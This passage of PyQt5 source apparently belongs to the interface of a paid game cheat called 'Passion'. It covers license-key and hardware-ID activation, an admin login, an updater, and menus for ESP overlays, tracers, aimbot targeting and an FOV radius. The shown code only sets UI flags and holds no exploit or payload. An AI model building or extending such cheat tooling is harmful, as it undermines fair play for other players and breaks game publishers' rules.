    def _start_download(self):
        self._update_btn.setEnabled(False)
        self._skip_btn.setEnabled(False)
        self._update_btn.setText("Downloading…")
        self._status.setText("Downloading update…")
        self._status.show()
        self._bar.show()

        self._worker = DownloadWorker(self._url)
        self._worker.progress.connect(self._bar.setValue)
        self._worker.finished.connect(self._on_downloaded)
        self._worker.failed.connect(self._on_failed)
        self._worker.start()

    def _on_downloaded(self, tmp_path: str):
        self._status.setText("Applying update…")
        QTimer.singleShot(300, lambda: _apply_update_and_restart(tmp_path))

    def _on_failed(self, err: str):
        self._status.setText(f"Failed: {err}")
        self._update_btn.setText("Retry")
        self._update_btn.setEnabled(True)
        self._skip_btn.setEnabled(True)

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        path = QPainterPath()
        path.addRoundedRect(1, 1, self.width()-2, self.height()-2, 12, 12)
        p.fillPath(path, QBrush(QColor(C["sidebar"])))
        p.setPen(QPen(QColor(C["border"]), 1))
        p.drawPath(path)


# ── Helpers ────────────────────────────────────────────────────────────────────
def lbl(text, px=13, color=None, bold=False) -> QLabel:
    l = QLabel(text)
    l.setFont(mkfont(px, QFont.Bold if bold else QFont.Normal))
    c = color or C["sub"]
    l.setStyleSheet(f"color:{c}; background:transparent; border:none;")
    return l


def make_input(placeholder="", password=False) -> QLineEdit:
    w = QLineEdit()
    w.setPlaceholderText(placeholder)
    w.setFixedHeight(43)
    w.setFont(mkfont(13))
    w.setStyleSheet(INPUT_SS)
    if password:
        w.setEchoMode(QLineEdit.Password)
    return w


def make_btn(text) -> QPushButton:
    b = QPushButton(text)
    b.setFixedHeight(43)
    b.setFont(mkfont(14, QFont.Bold))
    b.setCursor(QCursor(Qt.PointingHandCursor))
    b.setStyleSheet(BTN_SS)
    glow = QGraphicsDropShadowEffect()
    glow.setBlurRadius(24)
    glow.setOffset(0, 0)
    glow.setColor(QColor(220, 38, 37, 140))
    b.setGraphicsEffect(glow)
    return b


def glowing_label(text, px, base_color, glow_color, bold=False) -> QLabel:
    """Label with a text-shadow glow effect via stylesheet."""
    l = QLabel(text)
    l.setFont(mkfont(px, QFont.Bold if bold else QFont.Normal))
    l.setStyleSheet(f"""
        color: {base_color};
        background: transparent;
        border: none;
    """)
    # Add drop shadow for glow
    shadow = QGraphicsDropShadowEffect()
    shadow.setBlurRadius(12)
    shadow.setOffset(0, 0)
    shadow.setColor(QColor(glow_color))
    l.setGraphicsEffect(shadow)
    return l


# ── Avatar ─────────────────────────────────────────────────────────────────────
class AvatarWidget(QWidget):
    def __init__(self, size=38, parent=None):
        super().__init__(parent)
        self.setFixedSize(size, size)
        self._sz = size

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        s = self._sz
        # Circle bg
        path = QPainterPath()
        path.addEllipse(1, 1, s-2, s-2)
        p.fillPath(path, QBrush(QColor("#1e181a")))
        p.setPen(QPen(QColor("#3a2f32"), 1))
        p.drawPath(path)
        # Person silhouette
        p.setPen(Qt.NoPen)
        p.setBrush(QBrush(QColor("#5a5055")))
        cx = s // 2
        hr = s // 7
        p.drawEllipse(cx - hr, int(s * 0.18), hr*2, hr*2)
        bw = s // 3
        p.drawRoundedRect(cx - bw//2, int(s * 0.48), bw, int(s * 0.32), 3, 3)


# ── Auth Panel ─────────────────────────────────────────────────────────────────
class AuthPanel(QWidget):
    key_success   = pyqtSignal(dict)
    admin_success = pyqtSignal()

    def __init__(self, parent=None):
        super().__init__(parent)
        self.hwid    = get_hwid()
        self._worker = None
        self.setStyleSheet("background:transparent;")
        self._build()

    def _build(self):
        lay = QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        center = QHBoxLayout()
        center.setAlignment(Qt.AlignCenter)

        self.stack = QStackedWidget()
        self.stack.setFixedSize(340, WIN_H - 40)
        self.stack.setStyleSheet("background:transparent;")
        self.stack.addWidget(self._key_screen())
        self.stack.addWidget(self._login_screen())

        center.addWidget(self.stack)
        lay.addLayout(center)

        # Auto-login: if enabled and key saved, trigger after UI shown
        s = load_settings()
        if s.get("auto_login") and s.get("saved_key"):
            QTimer.singleShot(300, self._auto_login)

    def _auto_login(self):
        s = load_settings()
        key = s.get("saved_key", "").strip()
        if not key:
            return
        self.key_input.setText(key)
        self.key_btn.setEnabled(False)
        self.key_btn.setText("Auto-logging in…")
        self.key_err.hide()
        self._worker = ValidateWorker(key, self.hwid)
        self._worker.done.connect(self._on_auto_done)
        self._worker.start()

    def _on_auto_done(self, ok, err, info):
        self.key_btn.setEnabled(True)
        self.key_btn.setText("Activate")
        if ok:
            info["_key_raw"] = self.key_input.text().strip()
            self.key_success.emit(info)
        else:
            # Auto-login failed — clear saved key so user isn't stuck
            s = load_settings()
            s["saved_key"] = ""
            save_settings(s)
            self._kerr(f"Auto-login failed: {err}")

    def _key_screen(self):
        w = QWidget()
        w.setStyleSheet("background:transparent;")
        lay = QVBoxLayout(w)
        lay.setContentsMargins(20, 0, 20, 0)
        lay.setSpacing(0)
        lay.addStretch(1)

        t = glowing_label("Passion", 27, C["text"], "#dc2625aa", bold=True)
        t.setAlignment(Qt.AlignCenter)
        lay.addWidget(t)
        lay.addSpacing(7)

        s = lbl("Enter your license key to continue", 13, C["sub"])
        s.setAlignment(Qt.AlignCenter)
        lay.addWidget(s)
        lay.addSpacing(28)

        lay.addWidget(lbl("License Key", 12, C["muted"]))
        lay.addSpacing(6)
        self.key_input = make_input("PASS-XXXX-XXXX-XXXX-XXXX")
        self.key_input.returnPressed.connect(self._do_validate)
        lay.addWidget(self.key_input)
        lay.addSpacing(6)

        self.key_err = lbl("", 12, C["red"])
        self.key_err.setAlignment(Qt.AlignCenter)
        self.key_err.setWordWrap(True)
        self.key_err.hide()
        lay.addWidget(self.key_err)
        lay.addSpacing(4)

        self.key_btn = make_btn("Activate")
        self.key_btn.clicked.connect(self._do_validate)
        lay.addWidget(self.key_btn)
        lay.addStretch(2)

        row = QHBoxLayout()
        row.setAlignment(Qt.AlignCenter)
        row.setSpacing(4)
        row.addWidget(lbl("Admin?", 12, C["muted"]))
        link = lbl("Login", 12, C["red"])
        link.setCursor(QCursor(Qt.PointingHandCursor))
        link.setStyleSheet(f"color:{C['red']}; text-decoration:underline; background:transparent; border:none;")
        link.mousePressEvent = lambda _: self.stack.setCurrentIndex(1)
        row.addWidget(link)
        lay.addLayout(row)
        return w

    def _login_screen(self):
        w = QWidget()
        w.setStyleSheet("background:transparent;")
        lay = QVBoxLayout(w)
        lay.setContentsMargins(20, 0, 20, 0)
        lay.setSpacing(0)
        lay.addStretch(1)

        t = glowing_label("Passion", 27, C["text"], "#dc2625aa", bold=True)
        t.setAlignment(Qt.AlignCenter)
        lay.addWidget(t)
        lay.addSpacing(7)
        s = lbl("Admin sign in", 13, C["sub"])
        s.setAlignment(Qt.AlignCenter)
        lay.addWidget(s)
        lay.addSpacing(28)

        lay.addWidget(lbl("Username", 12, C["muted"]))
        lay.addSpacing(6)
        self.user_input = make_input()
        lay.addWidget(self.user_input)
        lay.addSpacing(14)

        lay.addWidget(lbl("Password", 12, C["muted"]))
        lay.addSpacing(6)
        self.pass_input = make_input(password=True)
        self.pass_input.returnPressed.connect(self._do_login)
        lay.addWidget(self.pass_input)
        lay.addSpacing(6)

        self.login_err = lbl("", 12, C["red"])
        self.login_err.setAlignment(Qt.AlignCenter)
        self.login_err.setWordWrap(True)
        self.login_err.hide()
        lay.addWidget(self.login_err)
        lay.addSpacing(4)

        self.login_btn = make_btn("Sign In")
        self.login_btn.clicked.connect(self._do_login)
        lay.addWidget(self.login_btn)
        lay.addStretch(2)

        row = QHBoxLayout()
        row.setAlignment(Qt.AlignCenter)
        row.setSpacing(4)
        row.addWidget(lbl("←", 12, C["muted"]))
        back = lbl("Back", 12, C["red"])
        back.setCursor(QCursor(Qt.PointingHandCursor))
        back.setStyleSheet(f"color:{C['red']}; text-decoration:underline; background:transparent; border:none;")
        back.mousePressEvent = lambda _: self.stack.setCurrentIndex(0)
        row.addWidget(back)
        lay.addLayout(row)
        return w

    def _do_validate(self):
        key = self.key_input.text().strip()
        if not key:
            self._kerr("Please enter your license key.")
            return
        self.key_btn.setEnabled(False)
        self.key_btn.setText("Validating…")
        self.key_err.hide()
        self._worker = ValidateWorker(key, self.hwid)
        self._worker.done.connect(self._on_validate)
        self._worker.start()

    def _on_validate(self, ok, err, info):
        self.key_btn.setEnabled(True)
        self.key_btn.setText("Activate")
        if ok:
            info["_key_raw"] = self.key_input.text().strip()
            # Always save key when auto_login is enabled
            s = load_settings()
            if s.get("auto_login") and info["_key_raw"]:
                s["saved_key"] = info["_key_raw"]
                save_settings(s)
            self.key_success.emit(info)
        else:
            self._kerr(err)

    def _kerr(self, msg):
        self.key_err.setText(msg)
        self.key_err.show()

    def _do_login(self):
        u, p = self.user_input.text().strip(), self.pass_input.text()
        if not u or not p:
            self._lerr("Enter username and password.")
            return
        self.login_btn.setEnabled(False)
        self.login_btn.setText("Signing in…")
        self.login_err.hide()
        self._worker = LoginWorker(u, p)
        self._worker.done.connect(self._on_login)
        self._worker.start()

    def _on_login(self, ok, err):
        self.login_btn.setEnabled(True)
        self.login_btn.setText("Sign In")
        if ok:
            # Use QTimer to delay the transition slightly
            QTimer.singleShot(100, self.admin_success.emit)
        else:
            self._lerr(err)

    def _lerr(self, msg):
        self.login_err.setText(msg)
        self.login_err.show()


# ── Nav Item ───────────────────────────────────────────────────────────────────
class NavItem(QWidget):
    clicked = pyqtSignal()

    def __init__(self, text, parent=None):
        super().__init__(parent)
        self.text     = text
        self._active  = False
        self._hovered = False
        self.setFixedHeight(38)
        self.setCursor(QCursor(Qt.PointingHandCursor))
        self.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)

    def setActive(self, v):
        self._active = v
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        W, H = self.width(), self.height()

        if self._active:
            # Subtle gradient background - leave 1px on right for sidebar border
            grad = QLinearGradient(0, 0, W - 1, 0)
            grad.setColorAt(0, QColor("#1f1315"))
            grad.setColorAt(1, QColor("#180f11"))
            p.fillRect(0, 0, W - 1, H, QBrush(grad))
            # Red left accent bar - pill shape
            bar = QPainterPath()
            bar.addRoundedRect(0, 8, 3, H - 16, 1.5, 1.5)
            p.fillPath(bar, QBrush(QColor(C["red"])))
            color = QColor(C["text"])
        elif self._hovered:
            p.fillRect(0, 0, W - 1, H, QColor("#171114"))
            color = QColor("#b0aab0")
        else:
            color = QColor(C["muted"])

        p.setPen(color)
        f = mkfont(13, QFont.Medium if self._active else QFont.Normal)
        p.setFont(f)
        p.drawText(QRect(20, 0, W - 20, H), Qt.AlignVCenter | Qt.AlignLeft, self.text)

    def mousePressEvent(self, e):
        self.clicked.emit()

    def enterEvent(self, e):
        self._hovered = True
        self.update()

    def leaveEvent(self, e):
        self._hovered = False
        self.update()


# ── Sidebar ────────────────────────────────────────────────────────────────────
class Sidebar(QWidget):
    nav_changed = pyqtSignal(int)
    NAV = ["Visual", "Aimbot", "Player", "Misc", "Settings"]

    def __init__(self, key_info: dict, parent=None):
        super().__init__(parent)
        self.setFixedWidth(SIDEBAR_W)
        self.key_info = key_info
        self._items   = []
        self._build()

    def _build(self):
        lay = QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(0)

        # Logo area
        logo_w = QWidget()
        logo_w.setFixedHeight(78)
        logo_w.setStyleSheet("background:transparent;")
        ll = QVBoxLayout(logo_w)
        ll.setAlignment(Qt.AlignCenter)
        ll.setContentsMargins(14, 8, 14, 8)

        logo_lbl  = QLabel()
        logo_lbl.setAlignment(Qt.AlignCenter)
        logo_lbl.setStyleSheet("background:transparent; border:none;")
        pix = QPixmap()
        pix.loadFromData(QByteArray(base64.b64decode(LOGO_B64)))
        if not pix.isNull():
            logo_lbl.setPixmap(pix.scaled(140, 56, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        else:
            logo_lbl.setText("PASSION")
            logo_lbl.setFont(mkfont(17, QFont.Bold))
            logo_lbl.setStyleSheet(f"color:{C['text']}; background:transparent; border:none;")
            shadow = QGraphicsDropShadowEffect()
            shadow.setBlurRadius(14); shadow.setOffset(0, 0)
            shadow.setColor(QColor(220, 38, 37, 120))
            logo_lbl.setGraphicsEffect(shadow)
        ll.addWidget(logo_lbl)
        lay.addWidget(logo_w)

        lay.addWidget(self._line())

        # Section label above nav
        nav_header = QLabel("NAVIGATION")
        nav_header.setFont(mkfont(9, QFont.Bold))
        nav_header.setStyleSheet(
            f"color:{C['muted']}; letter-spacing:2px; background:transparent; border:none;"
            " padding-left:20px;"
        )
        nav_header.setFixedHeight(28)
        lay.addWidget(nav_header)

        # Nav
        nav_w = QWidget()
        nav_w.setStyleSheet("background:transparent;")
        nl = QVBoxLayout(nav_w)
        nl.setContentsMargins(0, 2, 0, 4)
        nl.setSpacing(1)
        for i, name in enumerate(self.NAV):
            item = NavItem(name)
            item.clicked.connect(lambda idx=i: self._nav(idx))
            self._items.append(item)
            nl.addWidget(item)
        nl.addStretch()
        lay.addWidget(nav_w, 1)

        lay.addWidget(self._line())
        lay.addWidget(self._user_strip())

    def _line(self):
        f = QFrame()
        f.setFrameShape(QFrame.HLine)
        f.setFixedHeight(1)
        f.setStyleSheet(f"background:{C['border']}; border:none;")
        return f

    def _user_strip(self):
        w = QWidget()
        w.setFixedHeight(54)
        w.setStyleSheet("background:transparent;")
        row = QHBoxLayout(w)
        row.setContentsMargins(12, 0, 12, 0)
        row.setSpacing(9)

        row.addWidget(AvatarWidget(32))

        col = QVBoxLayout()
        col.setSpacing(2)

        raw = self.key_info.get("_key_raw", "")
        display = (raw[:9] + "••••") if raw else "Unknown"
        name_l = QLabel(display)
        name_l.setFont(mkfont(11, QFont.Medium))
        name_l.setStyleSheet(f"color:{C['sub']}; background:transparent; border:none;")

        exp_at = self.key_info.get("expires_at")
        if exp_at:
            from datetime import datetime, timezone
            try:
                exp  = datetime.fromisoformat(exp_at.replace("Z", "+00:00"))
                days = (exp - datetime.now(timezone.utc)).days
                exp_txt = f"Expires in {days}d" if days >= 0 else "Expired"
            except Exception:
                exp_txt = "Expires: —"
        else:
            exp_txt = "Unlimited"

        exp_l = QLabel(exp_txt)
        exp_l.setFont(mkfont(9))
        exp_l.setStyleSheet(f"color:{C['muted']}; background:transparent; border:none;")

        col.addWidget(name_l)
        col.addWidget(exp_l)
        row.addLayout(col)
        return w

    def set_active(self, i):
        for j, item in enumerate(self._items):
            item.setActive(j == i)

    def _nav(self, i):
        self.set_active(i)
        self.nav_changed.emit(i)

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        W, H = self.width(), self.height()
        R = float(RADIUS)

        # Clip: round top-left and bottom-left only (extend right past right edge)
        clip = QPainterPath()
        clip.addRoundedRect(0, 0, W + R + 2, H, R, R)
        p.setClipPath(clip)
        p.fillRect(0, 0, W, H, QColor(C["sidebar"]))
        p.setClipping(False)

        # Right divider
        p.setPen(QPen(QColor(C["border"]), 1))
        p.drawLine(W - 1, 0, W - 1, H)


# ── Rounded content stack ──────────────────────────────────────────────────────
class ContentStack(QStackedWidget):
    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        W, H = self.width(), self.height()
        R = float(RADIUS)

        # Clip: round top-right and bottom-right only (extend left past left edge)
        clip = QPainterPath()
        clip.addRoundedRect(-R - 2, 0, W + R + 2, H, R, R)
        p.setClipPath(clip)
        p.fillRect(0, 0, W, H, QColor(C["content"]))


# ── Scrollable page wrapper ────────────────────────────────────────────────────
def scrolled(inner: QWidget) -> QWidget:
    """Wrap a widget in a scroll area that doesn't fight the rounded corners."""
    scroll = QScrollArea()
    scroll.setWidgetResizable(True)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
    scroll.setStyleSheet(SCROLL_SS)
    # Make viewport transparent so ContentStack bg shows through
    scroll.setWidget(inner)
    scroll.viewport().setStyleSheet("background:transparent;")
    scroll.setFrameShape(QScrollArea.NoFrame)

    outer = QWidget()
    outer.setStyleSheet("background:transparent;")
    ol = QVBoxLayout(outer)
    ol.setContentsMargins(0, 0, 0, 0)
    ol.addWidget(scroll)
    return outer


# ── Section helpers ────────────────────────────────────────────────────────────
def section_lbl(text: str) -> QLabel:
    l = QLabel(text.upper())
    l.setFont(mkfont(9, QFont.Bold))
    l.setStyleSheet(
        f"color:{C['red']}; letter-spacing:3px; background:transparent; border:none;"
        " opacity: 0.8;"
    )
    return l


class ToggleSwitch(QWidget):
    """Animated iOS-style toggle switch."""
    toggled = pyqtSignal(bool)

    def __init__(self, checked=False, parent=None):
        super().__init__(parent)
        self._checked = checked
        self._anim_val = 1.0 if checked else 0.0
        self.setFixedSize(36, 20)
        self.setCursor(QCursor(Qt.PointingHandCursor))
        self._anim = QPropertyAnimation(self, b"anim_val")
        self._anim.setDuration(150)
        self._anim.setEasingCurve(QEasingCurve.OutCubic)

    def isChecked(self):
        return self._checked

    def setChecked(self, v):
        if v != self._checked:
            self._checked = v
            self._anim.stop()
            self._anim.setStartValue(self._anim_val)
            self._anim.setEndValue(1.0 if v else 0.0)
            self._anim.start()

    def _get_anim(self):
        return self._anim_val

    def _set_anim(self, v):
        self._anim_val = v
        self.update()

    from PyQt5.QtCore import pyqtProperty as _pyqtProperty
    anim_val = _pyqtProperty(float, _get_anim, _set_anim)

    def mousePressEvent(self, e):
        self.setChecked(not self._checked)
        self.toggled.emit(self._checked)

    def paintEvent(self, e):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        W, H = self.width(), self.height()
        t = self._anim_val
        off_col = QColor("#2a2326")
        on_col  = QColor(C["red"])
        r = int(off_col.red()   + (on_col.red()   - off_col.red())   * t)
        g = int(off_col.green() + (on_col.green() - off_col.green()) * t)
        b = int(off_col.blue()  + (on_col.blue()  - off_col.blue())  * t)
        p.setPen(Qt.NoPen)
        p.setBrush(QBrush(QColor(r, g, b)))
        p.drawRoundedRect(0, 0, W, H, H/2, H/2)
        pad = 2
        thumb_d = H - pad * 2
        travel = W - thumb_d - pad * 2
        x = pad + travel * t
        p.setBrush(QBrush(QColor("#ffffff")))
        p.drawEllipse(int(x), pad, thumb_d, thumb_d)


def toggle_row(text: str, default=False) -> QWidget:
    w = QWidget()
    w.setObjectName("toggleRow")
    w.setStyleSheet(f"""
        QWidget#toggleRow {{
            background: {C['card_bg']};
            border-radius: 7px;
            border: 1px solid {C['card_bdr']};
        }}
    """)
    w.setFixedHeight(36)
    h = QHBoxLayout(w)
    h.setContentsMargins(12, 0, 10, 0)

    l = QLabel(text)
    l.setFont(mkfont(12))
    l.setStyleSheet(f"color:{C['sub']}; background:transparent; border:none;")
    h.addWidget(l)
    h.addStretch()

    toggle = ToggleSwitch(default)
    h.addWidget(toggle)
    return w


SLIDER_SS = f"""
QSlider::groove:horizontal {{
    height: 3px;
    background: {C['input_bg']};
    border-radius: 2px;
    border: 1px solid {C['input_bdr']};
}}
QSlider::handle:horizontal {{
    background: {C['red']};
    border: none;
    width: 12px;
    height: 12px;
    margin: -5px 0;
    border-radius: 6px;
}}
QSlider::sub-page:horizontal {{
    background: {C['red']};
    border-radius: 2px;
}}
QSlider::handle:horizontal:hover {{
    background: #ec3534;
}}
"""


def slider_row(text: str, min_val: int, max_val: int, default: int,
               suffix: str = "") -> QWidget:
    """Toggle + label + slider that reveals when the checkbox is ticked."""
    container = QWidget()
    container.setObjectName("sliderRow")
    container.setStyleSheet(f"""
        QWidget#sliderRow {{
            background: {C['card_bg']};
            border-radius: 7px;
            border: 1px solid {C['card_bdr']};
        }}
    """)
    vlay = QVBoxLayout(container)
    vlay.setContentsMargins(12, 8, 10, 8)
    vlay.setSpacing(6)

    # ── top row: label + value readout + checkbox ──
    top = QHBoxLayout()
    top.setContentsMargins(0, 0, 0, 0)
    lbl_w = QLabel(text)
    lbl_w.setFont(mkfont(12))
    lbl_w.setStyleSheet(f"color:{C['sub']}; background:transparent; border:none;")
    top.addWidget(lbl_w)
    top.addStretch()

    val_lbl = QLabel(f"{default}{suffix}")
    val_lbl.setFont(mkfont(10))
    val_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;")
    val_lbl.setFixedWidth(44)
    val_lbl.setAlignment(Qt.AlignRight | Qt.AlignVCenter)
    top.addWidget(val_lbl)
    top.addSpacing(8)

    cb = ToggleSwitch()
    top.addWidget(cb)

    top_w = QWidget()
    top_w.setStyleSheet("background:transparent; border:none;")
    top_w.setLayout(top)
    vlay.addWidget(top_w)

    # ── slider row (hidden until enabled) ──
    slider = QSlider(Qt.Horizontal)
    slider.setMinimum(min_val)
    slider.setMaximum(max_val)
    slider.setValue(default)
    slider.setFixedHeight(18)
    slider.setStyleSheet(SLIDER_SS)
    slider.setVisible(False)
    vlay.addWidget(slider)

    def on_toggle(state):
        slider.setVisible(bool(state))

    def on_slide(v):
        val_lbl.setText(f"{v}{suffix}")

    cb.toggled.connect(on_toggle)
    slider.valueChanged.connect(on_slide)

    return container


def textbox_row(text: str, placeholder: str = "") -> QWidget:
    """Toggle + label + text input that reveals when the checkbox is ticked."""
    container = QWidget()
    container.setObjectName("textboxRow")
    container.setStyleSheet(f"""
        QWidget#textboxRow {{
            background: {C['card_bg']};
            border-radius: 7px;
            border: 1px solid {C['card_bdr']};
        }}
    """)
    vlay = QVBoxLayout(container)
    vlay.setContentsMargins(12, 8, 10, 8)
    vlay.setSpacing(6)

    top = QHBoxLayout()
    top.setContentsMargins(0, 0, 0, 0)
    lbl_w = QLabel(text)
    lbl_w.setFont(mkfont(12))
    lbl_w.setStyleSheet(f"color:{C['sub']}; background:transparent; border:none;")
    top.addWidget(lbl_w)
    top.addStretch()

    cb = ToggleSwitch()
    top.addWidget(cb)

    top_w = QWidget()
    top_w.setStyleSheet("background:transparent; border:none;")
    top_w.setLayout(top)
    vlay.addWidget(top_w)

    inp = QLineEdit()
    inp.setPlaceholderText(placeholder)
    inp.setFixedHeight(30)
    inp.setFont(mkfont(11))
    inp.setStyleSheet(INPUT_SS)
    inp.setVisible(False)
    vlay.addWidget(inp)

    cb.toggled.connect(lambda state: inp.setVisible(bool(state)))

    return container


def page_title(text: str) -> QLabel:
    l = QLabel(text)
    l.setFont(mkfont(18, QFont.Bold))
    shadow = QGraphicsDropShadowEffect()
    shadow.setBlurRadius(16)
    shadow.setOffset(0, 0)
    shadow.setColor(QColor(220, 38, 37, 60))
    l.setGraphicsEffect(shadow)
    l.setStyleSheet(f"color:{C['text']}; background:transparent; border:none;")
    return l


def visual_page() -> QWidget:
    inner = QWidget()
    inner.setStyleSheet("background:transparent;")
    lay = QVBoxLayout(inner)
    lay.setContentsMargins(20, 18, 20, 18)
    lay.setSpacing(4)
    lay.setAlignment(Qt.AlignTop)

    lay.addWidget(page_title("Visual"))
    lay.addSpacing(10)

    # ESP Toggle
    lay.addWidget(section_lbl("ESP"))
    lay.addSpacing(5)
    
    # Main ESP toggle
    esp_row = toggle_row("Enable ESP")
    esp_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] ESP toggled to: {state}"),
            globals().update({"esp_enabled": state, "esp_enabled_flag": state})
        ]
    )
    lay.addWidget(esp_row)
    lay.addSpacing(2)

    # Box ESP
    box_row = toggle_row("Box ESP")
    box_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Box ESP toggled to: {state}"),
            globals().update({"esp_box_enabled": state})
        ]
    )
    lay.addWidget(box_row)
    lay.addSpacing(2)

    # Filled Box
    filled_row = toggle_row("Filled Box")
    filled_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Filled Box toggled to: {state}"),
            globals().update({"esp_box_filled": state})
        ]
    )
    lay.addWidget(filled_row)
    lay.addSpacing(2)

    # Skeleton
    skeleton_row = toggle_row("Skeleton ESP")
    skeleton_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Skeleton toggled to: {state}"),
            globals().update({"esp_skeleton_enabled": state})
        ]
    )
    lay.addWidget(skeleton_row)
    lay.addSpacing(2)

    # Tracers
    tracers_row = toggle_row("Tracers")
    tracers_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Tracers toggled to: {state}"),
            globals().update({"esp_tracers_enabled": state})
        ]
    )
    lay.addWidget(tracers_row)
    lay.addSpacing(2)

    # Name ESP
    name_row = toggle_row("Name ESP")
    name_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Name ESP toggled to: {state}"),
            globals().update({"esp_name_enabled": state})
        ]
    )
    lay.addWidget(name_row)
    lay.addSpacing(2)
    
    # ESP Filters
    lay.addSpacing(10)
    lay.addWidget(section_lbl("FILTERS"))
    lay.addSpacing(5)
    
    # Ignore Team
    ignore_team_row = toggle_row("Ignore Team")
    ignore_team_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Ignore Team toggled to: {state}"),
            globals().update({"esp_ignoreteam": state})
        ]
    )
    lay.addWidget(ignore_team_row)
    lay.addSpacing(2)
    
    # Ignore Dead
    ignore_dead_row = toggle_row("Ignore Dead")
    ignore_dead_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Ignore Dead toggled to: {state}"),
            globals().update({"esp_ignoredead": state})
        ]
    )
    lay.addWidget(ignore_dead_row)
    lay.addSpacing(2)
    
    # Debug row
    debug_esp_row = toggle_row("Debug ESP (Show in console)")
    debug_esp_row.findChild(ToggleSwitch).toggled.connect(lambda state: print(f"[DEBUG] ESP debug toggled: {state}"))
    lay.addWidget(debug_esp_row)
    lay.addSpacing(2)

    lay.addStretch()
    return scrolled(inner)


def aimbot_page() -> QWidget:
    inner = QWidget()
    inner.setStyleSheet("background:transparent;")
    lay = QVBoxLayout(inner)
    lay.setContentsMargins(20, 18, 20, 18)
    lay.setSpacing(4)
    lay.setAlignment(Qt.AlignTop)

    lay.addWidget(page_title("Aimbot"))
    lay.addSpacing(10)

    # Aimbot Toggle
    lay.addWidget(section_lbl("AIMBOT"))
    lay.addSpacing(5)
    
    aim_row = toggle_row("Enable Aimbot")
    aim_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Aimbot toggled to: {state}"),
            globals().update({"aimbot_enabled": state})
        ]
    )
    lay.addWidget(aim_row)
    lay.addSpacing(2)
    
    # Aim Method Selection
    method_row = QHBoxLayout()
    method_row.addWidget(lbl("Aim Method:", 13, C["sub"]))
    method_row.addStretch()
    
    camera_btn = QPushButton("Camera")
    camera_btn.setFixedSize(70, 30)
    camera_btn.setStyleSheet(f"""
        QPushButton {{
            background: {C['input_bg']}; color: {C['text']};
            border: 1px solid {C['input_bdr']}; border-radius: 5px;
        }}
        QPushButton:checked {{ background: {C['red']}; color: white; border: none; }}
    """)
    camera_btn.setCheckable(True)
    camera_btn.setChecked(True)
    camera_btn.clicked.connect(lambda: globals().update({"aim_method": "Camera"}))
    
    mouse_btn = QPushButton("Mouse")
    mouse_btn.setFixedSize(70, 30)
    mouse_btn.setStyleSheet(camera_btn.styleSheet())
    mouse_btn.setCheckable(True)
    mouse_btn.clicked.connect(lambda: globals().update({"aim_method": "Mouse"}))
    
    camera_btn.toggled.connect(lambda checked: mouse_btn.setChecked(not checked) if checked else None)
    mouse_btn.toggled.connect(lambda checked: camera_btn.setChecked(not checked) if checked else None)
    
    method_row.addWidget(camera_btn)
    method_row.addWidget(mouse_btn)
    method_widget = QWidget()
    method_widget.setLayout(method_row)
    lay.addWidget(method_widget)
    lay.addSpacing(2)
    
    # Body Part Selection
    part_row = QHBoxLayout()
    part_row.addWidget(lbl("Body Part:", 13, C["sub"]))
    part_row.addStretch()
    
    head_btn = QPushButton("Head")
    head_btn.setFixedSize(60, 30)
    head_btn.setStyleSheet(f"""
        QPushButton {{
            background: {C['input_bg']}; color: {C['text']};
            border: 1px solid {C['input_bdr']}; border-radius: 5px;
        }}
        QPushButton:checked {{ background: {C['red']}; color: white; border: none; }}
    """)
    head_btn.setCheckable(True)
    head_btn.setChecked(True)
    head_btn.clicked.connect(lambda: globals().update({"aimbot_hitpart": "Head"}))
    
    body_btn = QPushButton("Body")
    body_btn.setFixedSize(60, 30)
    body_btn.setStyleSheet(head_btn.styleSheet())
    body_btn.setCheckable(True)
    body_btn.clicked.connect(lambda: globals().update({"aimbot_hitpart": "UpperTorso"}))
    
    # Make them mutually exclusive
    head_btn.toggled.connect(lambda checked: body_btn.setChecked(not checked) if checked else None)
    body_btn.toggled.connect(lambda checked: head_btn.setChecked(not checked) if checked else None)
    
    part_row.addWidget(head_btn)
    part_row.addWidget(body_btn)
    
    part_widget = QWidget()
    part_widget.setLayout(part_row)
    lay.addWidget(part_widget)
    lay.addSpacing(2)
    
    # FOV Settings
    lay.addWidget(section_lbl("FOV"))
    lay.addSpacing(5)
    
    use_fov_row = toggle_row("Use FOV")
    use_fov_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Use FOV toggled to: {state}"),
            globals().update({"use_fov_enabled": state})
        ]
    )
    lay.addWidget(use_fov_row)
    lay.addSpacing(2)
    
    show_fov_row = toggle_row("Show FOV Circle")
    show_fov_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Show FOV toggled to: {state}"),
            globals().update({"show_fov_enabled": state})
        ]
    )
    lay.addWidget(show_fov_row)
    lay.addSpacing(2)
    
    # FOV Slider
    fov_slider = slider_row("FOV Radius", 20, 600, 150, "px")
    
    # Connect FOV slider
    slider_container = fov_slider.findChild(QSlider)
